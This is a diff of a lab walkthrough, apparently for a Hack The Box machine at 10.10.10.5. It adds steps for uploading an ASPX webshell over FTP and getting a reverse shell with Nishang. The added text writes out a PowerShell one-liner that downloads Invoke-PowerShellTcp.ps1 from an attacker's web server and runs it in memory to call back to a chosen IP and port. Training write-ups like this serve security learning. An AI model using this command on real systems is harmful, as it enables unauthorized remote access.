@@ -41,11 +41,27 @@ With FTP upload the webshell, using "put" command for this purpose:
 
 Try to see the webshell through browser, in http://10.10.10.5/cmdasp.aspx:
 
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107413825-34bd3b00-6adf-11eb-825d-a8d618e3ae18.jpg"></p>
 
+You can see that is possible run commands efectly, then the more obviusly thought is get a reverse shell. For this, use Nishang that is a framework and collection of scripts and payloads which enables usage of PowerShell, in concret, you go to use the module of shells PS "Invoke-PowerShellTcp.ps1":
+
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107414596-39362380-6ae0-11eb-84c9-9d326bf577c9.jpg"></p>
+
+<p align="center">https://github.com/samratashok/nishang/tree/master/Shells</p>
 
 # 04: Exploitation
 
----
+Download the RAW file of this module:
+
+A goood approach is execute the reverseShell in memory, like Nishang project describe:
+
+*Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.*
+
+The next line is used for this:
+
+``
+powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+``
 
 # 05: Post-Exploitation
 
